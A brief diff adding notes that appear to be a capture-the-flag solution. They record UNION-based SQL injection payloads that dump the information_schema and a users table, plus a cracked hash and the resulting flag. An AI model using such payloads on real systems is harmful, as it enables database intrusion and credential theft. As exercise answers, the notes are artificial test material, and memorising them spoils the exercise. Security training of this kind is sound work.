@@ -1,0 +1,10 @@
+try to see information_schema table 
+
+1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
+=>can see all the tables
+
+1 or 1=1 UNION select user_id, Commentaire FROM users
+
+decrypt -> 5ff9d0165b4f92b14994e5c685cdce28 == FortyTwo 
+
+fortytwo -> SH256 == 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 
